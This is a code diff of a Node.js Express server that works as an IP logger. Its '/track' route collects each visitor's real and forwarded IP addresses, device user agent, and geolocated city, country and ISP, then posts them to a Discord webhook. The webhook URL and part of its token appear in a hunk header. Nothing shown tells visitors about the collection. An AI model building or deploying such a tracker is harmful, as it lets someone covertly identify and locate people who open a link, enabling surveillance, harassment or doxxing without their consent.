@@ -8,32 +8,28 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1511274000641167400/K-dYT4
 
 app.set("trust proxy", true);
 
-// Serve index.html
+// Home
 app.get("/", (req, res) => {
     res.sendFile("index.html", { root: process.cwd() });
 });
 
-// TRACK ROUTE
+// TRACK
 app.get("/track", async (req, res) => {
 
     // =========================
-    // 1. GET REAL IP
+    // 1. RAW IP SOURCES
     // =========================
-    const rawIp =
-        req.headers["x-forwarded-for"] ||
-        req.socket.remoteAddress ||
-        "";
+    const forwarded = req.headers["x-forwarded-for"] || "None";
+    const socketIp = req.socket.remoteAddress || "None";
 
-    let ip = rawIp.split(",")[0].trim();
-
-    // Clean IPv6-mapped IPv4
-    ip = ip.replace("::ffff:", "");
+    // Clean first real IP from forwarded list
+    let realIp = forwarded.split(",")[0].trim();
+    realIp = realIp.replace("::ffff:", "");
 
     const userAgent = req.headers["user-agent"] || "Unknown";
 
-    // Detect IP type
-    const isIPv6 = ip.includes(":");
-    const isIPv4 = ip.includes(".");
+    const isIPv6 = realIp.includes(":");
+    const isIPv4 = realIp.includes(".");
 
     // =========================
     // 2. GEO LOOKUP
@@ -42,19 +38,17 @@ app.get("/track", async (req, res) => {
     let country = "Unknown";
     let isp = "Unknown";
     let org = "Unknown";
-    let latitude = "";
-    let longitude = "";
 
     const isLocal =
-        ip === "::1" ||
-        ip === "127.0.0.1" ||
-        ip.startsWith("192.168.") ||
-        ip.startsWith("10.") ||
-        ip.startsWith("172.");
+        realIp === "::1" ||
+        realIp === "127.0.0.1" ||
+        realIp.startsWith("192.168.") ||
+        realIp.startsWith("10.") ||
+        realIp.startsWith("172.");
 
-    if (!isLocal && ip) {
+    if (!isLocal && realIp) {
         try {
-            const geoRes = await fetch(`https://ipwho.is/${ip}`);
+            const geoRes = await fetch(`https://ipwho.is/${realIp}`);
             const data = await geoRes.json();
 
             if (data.success) {
@@ -62,8 +56,6 @@ app.get("/track", async (req, res) => {
                 country = data.country || "Unknown";
                 isp = data.connection?.isp || "Unknown";
                 org = data.connection?.org || "Unknown";
-                latitude = data.latitude || "";
-                longitude = data.longitude || "";
             }
         } catch (err) {
             console.error("Geo lookup failed:", err);
@@ -74,19 +66,20 @@ app.get("/track", async (req, res) => {
     }
 
     // =========================
-    // 3. BUILD DISCORD MESSAGE
+    // 3. DISCORD MESSAGE (3 IPs)
     // =========================
     const message = `
 🇵🇭 New Visitor Logged
 
-🌍 IP: ${ip}
+🌍 Real IP: ${realIp}
+📦 Forwarded IPs: ${forwarded}
+🧠 Socket IP: ${socketIp}
+
 📶 Type: ${isIPv4 ? "IPv4" : isIPv6 ? "IPv6" : "Unknown"}
 
 📍 Location: ${city}, ${country}
 🏢 ISP: ${isp}
 🏢 Org: ${org}
-
-📡 Coordinates: ${latitude || "N/A"}, ${longitude || "N/A"}
 
 🖥️ Device: ${userAgent}
 `;
@@ -107,7 +100,7 @@ app.get("/track", async (req, res) => {
     res.sendStatus(200);
 });
 
-// START SERVER
+// START
 app.listen(PORT, () => {
     console.log("Server running on port " + PORT);
 });
